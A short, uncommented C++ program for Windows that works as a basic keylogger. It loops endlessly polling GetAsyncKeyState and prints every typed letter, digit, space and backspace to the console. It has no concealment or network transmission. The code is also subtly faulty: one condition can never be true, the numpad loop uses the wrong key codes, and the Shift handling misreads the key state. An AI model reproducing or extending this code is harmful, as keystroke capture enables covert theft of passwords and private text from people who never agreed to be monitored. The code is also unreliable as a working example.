#include <iostream>
#include <windows.h>

using namespace std;

int main ()
{
    int shift = 0;
    while(true)
    {
        if(GetAsyncKeyState(VK_SHIFT) & 0x0001)
        {
            shift = 26;
        }
        else if(GetAsyncKeyState(VK_SHIFT) & !0x0001)
        {
            shift = 0;
        }
        for(int n = 65; n < 65 + 26; n++)
        {
            SHORT msg;
            if(msg = GetAsyncKeyState(n) & 0x0001)
            {
                int n1 = n - 65;
                char msgout = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"[n1 + shift];
                cout<<msgout;
                Sleep(10);
            }
        }
        for(int n = 48; n < 48 + 10; n++)
        {
            SHORT msg;
            if(msg = GetAsyncKeyState(n) & 0x0001)
            {
                int n1 = n - 48;
                char msgout = "0123456789"[n1];
                cout<<msgout;
                Sleep(10);
            }
        }
        for(int n = 91; n < 91 + 10; n++)
        {
            SHORT msg;
            if(msg = GetAsyncKeyState(n) & 0x0001)
            {
                int n1 = n - 91;
                char msgout = "0123456789"[n1];
                cout<<"[n"<<msgout<<"]";
                Sleep(10);
            }
        }
        if(GetAsyncKeyState(VK_SPACE) & 0x0001)
        {
            cout<<" ";
        }
        else if(GetAsyncKeyState(VK_BACK))
        {
            cout<<"~";
        }
    }
    return 0;
}